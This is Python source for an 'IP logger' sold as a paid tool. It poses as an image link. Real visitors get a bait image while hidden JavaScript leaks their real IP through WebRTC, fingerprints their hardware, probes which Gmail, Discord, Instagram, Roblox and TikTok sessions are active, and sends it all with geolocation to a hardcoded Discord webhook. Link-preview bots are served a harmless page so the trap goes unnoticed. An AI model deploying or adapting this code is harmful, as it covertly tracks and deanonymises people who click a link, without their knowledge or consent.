# ==============================================================================
#  _    _  ____  _      __     __  _____ __     __  _____  _______  ______  __  __ 
# | |  | |/ __ \| |     \ \   / / / ____|\ \   / / / ____||__   __||  ____||  \/  |
# | |__| | |  | | |      \ \_/ / | (___   \ \_/ / | (___     | |   | |__   | \  / |
# |  __  | |  | | |       \   /   \___ \   \   /   \___ \    | |   |  __|  | |\/| |
# | |  | | |__| | |____    | |    ____) |   | |    ____) |   | |   | |____ | |  | |
# |_|  |_|\____/|______|   |_|   |_____/    |_|   |_____/    |_|   |______||_|  |_|
# ==============================================================================
# HOLY SYSTEM v25.0 | Paid System!
# ==============================================================================

from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import json
import time
import base64

# --- CONFIGURATION ---
config = {
    "webhook": "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6",
    "image": "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg",
    "username": "TITAN NEBULA LOGGER",
    "color": 0x00FFFF # Cyan
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
            ua = self.headers.get('user-agent', 'Unknown')
            
            # 1. BOT & CRAWLER PROTECTION
            is_bot = any(b in ua for b in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot"])
            if is_bot:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f'<html><head><meta property="og:image" content="{config["image"]}"></head></html>'.encode())
                return

            # 2. SERVER-SIDE GEOLOCATION
            geo_info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
            os_info, br_info = httpagentparser.simple_detect(ua)

            # 3. DEPLOYING THE JAVASCRIPT AGENT
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()

            content = f'''
            <!DOCTYPE html>
            <html>
            <head><title>Loading Image...</title></head>
            <body style="background:#000;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;">
                <img src="{config["image"]}" id="bait" style="max-width:100%;height:auto;">
                
                <script>
                async function captureAll() {{
                    let data = {{}};
                    
                    // --- NETWORK ANALYSIS ---
                    const pc = new RTCPeerConnection({{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}});
                    pc.createDataChannel("");
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = i => {{
                        if(i && i.candidate) {{
                            data.real_ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate)[1];
                        }}
                    }};

                    // --- HARDWARE FINGERPRINTING ---
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";

                    // --- SOCIAL SESSION SNIFFER ---
                    const sites = [
                        {{n:"Gmail", u:"https://accounts.google.com/ServiceLogin?service=mail"}},
                        {{n:"Discord", u:"https://discord.com/api/v9/experiments"}},
                        {{n:"Instagram", u:"https://www.instagram.com/accounts/login/"}},
                        {{n:"Roblox", u:"https://www.roblox.com/mobileapi/check-app-launch"}},
                        {{n:"TikTok", u:"https://www.tiktok.com/login"}}
                    ];
                    let activeSessions = [];
                    for(let s of sites) {{
                        try {{
                            const ctrl = new AbortController();
                            setTimeout(() => ctrl.abort(), 1000);
                            await fetch(s.u, {{ mode: 'no-cors', signal: ctrl.signal }});
                            activeSessions.push(s.n);
                        }} catch(e) {{}}
                    }}

                    // --- FINAL DATA PACKET ---
                    const payload = {{
                        "username": "{config["username"]}",
                        "embeds": [{{
                            "title": "🌌 NEBULA - IP LOGGED",
                            "color": {config["color"]},
                            "description": "**A User Opened the Original Image!**\\n\\n" +
                                "**IP Info:**\\n" +
                                "> **IP:** `{ip}`\\n" +
                                "> **Real IP (Bypass):** `" + (data.real_ip || "Secure") + "`\\n" +
                                "> **Provider:** `{geo_info.get('isp', 'N/A')}`\\n" +
                                "> **Country:** `{geo_info.get('country', 'N/A')}`\\n" +
                                "> **City/Region:** `{geo_info.get('city', 'N/A')}, {geo_info.get('regionName', 'N/A')}`\\n" +
                                "> **VPN/Proxy:** `{geo_info.get('proxy', 'False')}`\\n" +
                                "> **Mobile:** `{geo_info.get('mobile', 'False')}`\\n\\n" +
                                "**PC/Hardware Info:**\\n" +
                                "> **OS:** `{os_info}`\\n" +
                                "> **Browser:** `{br_info}`\\n" +
                                "> **GPU:** `" + gpu + "`\\n" +
                                "> **Memory:** " + (navigator.deviceMemory || "N/A") + "GB\\n" +
                                "> **CPU Cores:** " + navigator.hardwareConcurrency + "\\n\\n" +
                                "**Active Sessions:**\\n" +
                                "> `" + (activeSessions.join(" | ") || "None Detected") + "`\\n\\n" +
                                "**User Agent:**\\n" +
                                "```" + navigator.userAgent + "```",
                            "footer": {{"text": "Titan Nebula v25.0 | Secure Logging"}}
                        }}]
                    }};

                    navigator.sendBeacon("{config["webhook"]}", new Blob([JSON.stringify(payload)], {{type: 'application/json'}}));
                }}
                
                window.onload = () => {{
                    captureAll();
                }};
                </script>
            </body>
            </html>
            '''
            self.wfile.write(content.encode('utf-8'))

        except Exception as e:
            # Fallback
            self.send_response(302)
            self.send_header('Location', config["image"])
            self.end_headers()

app = handler
